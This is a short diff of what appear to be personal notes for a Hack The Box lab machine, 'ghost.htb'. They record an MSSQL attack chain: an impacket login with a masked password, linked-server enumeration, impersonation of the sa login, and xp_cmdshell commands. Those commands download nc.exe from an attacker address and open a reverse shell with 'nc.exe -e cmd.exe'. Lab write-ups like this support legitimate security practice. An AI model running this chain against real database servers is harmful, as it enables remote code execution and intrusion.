@@ -14,9 +14,13 @@ impacket-mssqlclient florence.ramirez:'He*****'@ghost.htb -windows-auth
 ux******和He******都可以
 
 enum_links
+
 use_link [PRIMARY]
+
 use master
+
 exec_as_login sa
+
 [impacket-mssqlclient] --> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.xx.xx/nc.exe -OutFile $env:TEMP\nc.exe"'
                            EXEC xp_cmdshell '%TEMP%\nc.exe -e cmd.exe 10.10.xx.xx xxxx';
 [python3 mssqlclient.py] --> xp_cmdshell
